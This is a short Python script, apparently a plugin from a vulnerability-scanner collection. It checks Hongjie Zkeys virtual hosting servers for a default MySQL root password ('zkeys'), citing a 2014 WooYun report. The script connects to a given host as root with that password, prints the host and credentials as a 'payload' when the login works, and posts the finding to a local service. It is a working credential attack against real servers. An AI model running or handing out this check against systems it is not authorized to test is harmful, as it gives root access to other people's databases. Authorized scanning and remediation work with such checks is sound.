#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 宏杰Zkeys虚拟主机默认数据库漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-048350
author: Lucifer
description: 宏杰Zkeys虚拟主机默认开启999端口，默认数据库密码zkeys可连接root。
'''
import sys
import pymysql
import warnings
from termcolor import cprint
from urllib.parse import urlparse
import requests
class zkeys_database_conf_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 3306
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if self.url.find(":") >= 0:
                host = self.url.split(":")[0]
                port = int(self.url.split(":")[1])
            else:
                host = self.url

        try:
            conn = pymysql.connect(host=host, user="root", passwd="zkeys", port=port, connect_timeout=6)
            if conn.ping().server_status == 0:
                cprint("[+]存在宏杰Zkeys虚拟主机默认数据库漏洞...(高危)\tpayload: "+host+":"+str(port)+" root:zkeys", "red")
                postdata = {self.url:"存在宏杰Zkeys虚拟主机默认数据库漏洞...(高危)\tpayload: "+host+":"+str(port)+" root:zkeys"}
                requests.post('http://localhost:8848/system', json=postdata) 
            else:
                cprint("[-]不存在zkeys_database_conf漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = zkeys_database_conf_BaseVerify(sys.argv[1])
    testVuln.run()